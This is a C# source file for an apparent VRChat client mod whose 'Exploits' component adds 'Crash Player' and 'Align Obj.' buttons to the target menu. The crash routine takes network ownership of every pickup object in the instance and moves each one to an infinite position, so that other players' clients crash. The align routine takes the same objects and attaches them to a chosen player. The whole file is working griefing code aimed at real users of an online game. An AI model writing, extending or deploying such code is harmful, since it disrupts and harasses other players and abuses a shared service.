using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ReMod.Core;
using ReMod.Core.Managers;
using ReMod.Core.UI.QuickMenu;
using ReModCE.Components;
using VRC;
using VRC.SDKBase;
using UnityEngine;
using ReMod.Core.VRChat;

namespace ReModCE.Exploits
{
    internal class TargetCrash : ModComponent
    {
        private string objectcrashname;
        public override void OnUiManagerInit(UiManager uiManager)
        {
            var targetMenu = uiManager.TargetMenu;
            targetMenu.AddButton("Align Obj.", "Align objects to player", AlignToPlayer);
            targetMenu.AddButton("Crash Player", "Crash Player", CrashPlayer);
        }

        private void AlignToPlayer()
        {
            var user = QuickMenuEx.SelectedUserLocal.field_Private_IUser_0;
            if (user == null)
                return;
            var t = PlayerManager.field_Private_Static_PlayerManager_0.GetPlayer(user.prop_String_0).transform;
            foreach (var b in Resources.FindObjectsOfTypeAll<VRC_Pickup>())
            {
                if(b == null) continue;

                Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0, b.gameObject);
                b.gameObject.transform.SetPositionAndRotation(t.position, t.rotation);
                b.transform.parent = t;
            }
        }

        private void CrashPlayer()
        {
            foreach (var b in Resources.FindObjectsOfTypeAll<VRC_Pickup>())
            {
                Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0, b.gameObject);
                b.gameObject.transform.SetPositionAndRotation(new Vector3(b.transform.position.x, Vector3.positiveInfinity.y, b.transform.rotation.z), b.transform.rotation);
                b.transform.parent = null;
            }
        }
    }
}
